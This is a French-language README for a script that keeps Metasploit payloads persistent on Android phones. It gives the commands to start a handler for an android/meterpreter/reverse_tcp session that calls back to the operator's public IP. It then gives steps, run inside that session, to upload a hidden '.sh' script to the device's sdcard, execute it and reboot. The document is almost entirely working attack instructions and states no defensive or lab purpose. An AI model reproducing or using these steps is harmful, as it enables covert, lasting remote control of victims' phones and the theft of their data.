# MSF PERSISTANCE ANDROID

![msf](https://raw.githubusercontent.com/oda-alexandre/msf-persistance-android/master/img/logo-msf.png) ![android](https://raw.githubusercontent.com/oda-alexandre/msf-persistance-android/master/img/logo-android.png)


## INDEX

- [Introduction](#INTRODUCTION)
- [Prerequis](#PREREQUIS)
- [Utilisation](#UTILISATION)
- [License](#LICENSE)


## INTRODUCTION

Ce script permet la persistance des payload sur smartphone Android via Metasploit.


## PREREQUIS

utiliser [Metasploit](https://www.metasploit.com/)


## UTILISATION

1 - Mettez le script msf-persistance-android.sh dans votre dossier personnel et renommez le .sh


2 - Ouvrir MSF

```
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost VOTRE IP PUBLIC
set lport LE PORT DE VOTRE CHOIX
exploit
```


3 - Copier/Coller dans un terminal en console MSF avec une session android/meterpreter/reverse_tcp

```
cd /
cd sdcard
upload ~/.sh
shell
cd /
cd sdcard
sh .sh
reboot
exit
```


## LICENSE

[![GPLv3+](http://gplv3.fsf.org/gplv3-127x51.png)](https://github.com/oda-alexandre/msf-persistance-android/blob/master/LICENSE)
